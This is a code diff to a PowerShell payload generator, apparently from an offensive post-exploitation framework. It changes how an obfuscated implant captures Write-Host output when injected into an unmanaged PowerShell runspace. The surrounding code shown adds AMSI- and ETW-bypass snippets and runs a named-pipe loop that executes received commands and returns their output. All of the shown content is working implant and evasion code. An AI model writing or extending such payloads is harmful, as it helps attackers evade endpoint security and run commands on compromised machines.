@@ -178,12 +178,14 @@ function New-PayloadScript {
     $vRes=(&$rnd); $vErr=(&$rnd); $vJ=(&$rnd); $vT=(&$rnd)
     $vSec=(&$rnd); $vSid=(&$rnd); $vAr=(&$rnd); $vTm=(&$rnd)
     $vCb=(&$rnd); $vGz=(&$rnd); $vA=(&$rnd); $vB=(&$rnd)
-    $vC=(&$rnd); $vD=(&$rnd)
+    $vC=(&$rnd); $vD=(&$rnd); $vWHO=(&$rnd)
 
-    # In a CLR Runspace with no PSHost (InjectUnmanagedPS path), Write-Host silently discards
-    # output because there is no host UI to write to and the Information stream is never dispatched.
-    # Override Write-Host globally to redirect to Write-Output so *>&1|Out-String captures it.
-    $whOverride = "function global:Write-Host{param([Parameter(ValueFromPipeline=`$true,ValueFromRemainingArguments=`$true)][Object]`$Object,[switch]`$NoNewline,[System.ConsoleColor]`$ForegroundColor,[System.ConsoleColor]`$BackgroundColor,[string]`$Separator);if(`$null -ne `$Object){if(`$Object -is [array]){Write-Output(`$Object-join' ')}else{Write-Output `$Object}}}"
+    # Write-Host in a CLR Runspace (InjectUnmanagedPS) discards output — no PSHost, stream 6
+    # is never dispatched and *>&1 has nothing to capture. Fix: store the Write-Host override
+    # as a string variable and prepend it to every command scriptblock so it is always in the
+    # same scope as the executing command. Function lookup finds it before the built-in cmdlet.
+    $whFuncDef = 'function Write-Host{param([Parameter(ValueFromPipeline=$true,ValueFromRemainingArguments=$true)][Object]$whO,[switch]$whNL,[System.ConsoleColor]$whFC,[System.ConsoleColor]$whBC,[string]$whS);if($null -ne $whO){Write-Output $whO}}'
+    $whOverride = "`$$vWHO='$whFuncDef'"
 
     $amsiSnippet = Get-AmsiBypassSnippet -Technique $Config.Amsi
     $etwSnippet  = Get-EtwBypassSnippet  -Technique $Config.Etw
@@ -234,7 +236,7 @@ function New-PayloadScript {
             "`$$vCmd=`$$vRd.ReadLine();" +
             "if(`$$vCmd -eq 'exit'){break};" +
             "$moduleHandler;" +
-            "try{`$$vRes=. ([scriptblock]::Create(`$$vCmd)) *>&1|Out-String;" +
+            "try{`$$vRes=. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|Out-String;" +
             "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
             "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
             "`$$vPipe.Close();`$$vPipe.Dispose()"
@@ -269,7 +271,7 @@ function New-PayloadScript {
             "if(`$$vCb){`$$vCb=`$false}else{`$$vCmd=`$$vRd.ReadLine()};" +
             "if(`$$vCmd -eq 'exit'-or`$null -eq `$$vCmd){break};" +
             "$moduleHandler;" +
-            "try{`$$vRes=. ([scriptblock]::Create(`$$vCmd)) *>&1|Out-String;" +
+            "try{`$$vRes=. ([scriptblock]::Create(`$$vWHO+';'+`$$vCmd)) *>&1|Out-String;" +
             "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
             "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
             "`$$vPipe.Dispose()"
